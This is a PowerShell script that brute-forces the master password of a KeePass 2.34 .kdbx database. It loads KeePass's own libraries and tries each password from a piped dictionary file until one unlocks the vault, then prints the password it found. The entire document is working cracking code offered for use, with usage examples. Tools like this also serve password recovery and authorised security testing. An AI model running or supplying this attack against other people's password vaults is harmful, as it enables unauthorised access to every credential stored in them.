#requires -version 2
<#
.SYNOPSIS
  
  This script provides a simple dictionary based brute force function allowing you to run a dictionary file against a KeePass 2.34 .kdbx file.  If it finds the key, it will inform you of the master password

.DESCRIPTION
  
  The script performs a dictionary attack against keepass .kdbx files

.PARAMETER binpath
    
    This is the path for the KeePass 2.34 files - Typically on a default install will be "c:\program files (x86)\KeePass2x\"

.PARAMETER targetfile
    
    This is the path for the target kdbx file


.NOTES
  Version:            0.2
  Author:             Wayne Evans, milleniumbug
  Modification date:  24/07/2017
  Purpose/Change:     Refactoring + extensions

  Version:            0.1
  Author:             Wayne Evans
  Creation Date:      20/12/2016
  Purpose/Change:     Initial script development

  This script is quite slow, but will get the job done - It works at about 500 keys per second currently.  
  
.EXAMPLE

Get-Content -Encoding UTF8 "c:\software\pwdlist.txt" | Crack-KeePassFile -binpath "C:\Program Files (x86)\KeePass Password Safe 2" -targetfile "c:\software\posh.kdbx"

  
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)]
    [string]$binpath,
    [Parameter(Mandatory=$true)]
    [string]$targetfile
)

function Load-KeePassBinaries {
    param
    (
        [Parameter(Mandatory=$true)]
        [string]$path
    )
    if((Test-Path $path) –eq $false) 
    {
        throw [System.ArgumentException] "The path $path is invalid"
    }
    try
    {
        [Reflection.Assembly]::LoadFile("$path\KeePass.exe")|Out-Null
        [Reflection.Assembly]::LoadFile("$path\KeePass.XmlSerializers.dll")|Out-Null
    }
    catch
    {
        throw [System.ArgumentException] "Unable Load KeePass Binaries - check path $path"
    }
}

function Try-UnlockDatabase($Database, $IOConnectionInfo, $password)
{
    $Key = New-Object KeePassLib.Keys.CompositeKey
    $Key.AddUserKey((New-Object KeePassLib.Keys.KcpPassword($password)));
    try
    {
        $Database.Open($IOConnectionInfo,$Key,$null)
        return $true
    }
    catch [KeePassLib.Keys.InvalidCompositeKeyException]
    {
        return $false
    }
}

function Crack-KeePassFile
{
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$binpath,
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        [string]$password,
        [Parameter(Mandatory=$true)]
        [string]$targetfile
    )
    begin
    {
        Load-KeePassBinaries -path $binpath
        $Database = New-Object KeePassLib.PwDatabase
        $IOConnectionInfo = New-Object KeePassLib.Serialization.IOConnectionInfo
        $IOConnectionInfo.Path = $targetfile
        $sw = [Diagnostics.Stopwatch]::StartNew()
        $count = 0
    }
    process
    {
        if(Try-UnlockDatabase $Database $IOConnectionInfo $password)
        {
            Write-Warning "Master Password Found = $password"
            break
        }
        if($count % 1000 -eq 0)
        {
            Write-Output "Number of Keys checked against Database:$count Elapsed Time = $($sw.Elapsed)"
        }
        $count++
    }
    end
    {
        $sw.Stop()
    }
}

$input | Crack-KeePassFile -binpath $binpath -targetfile $targetfile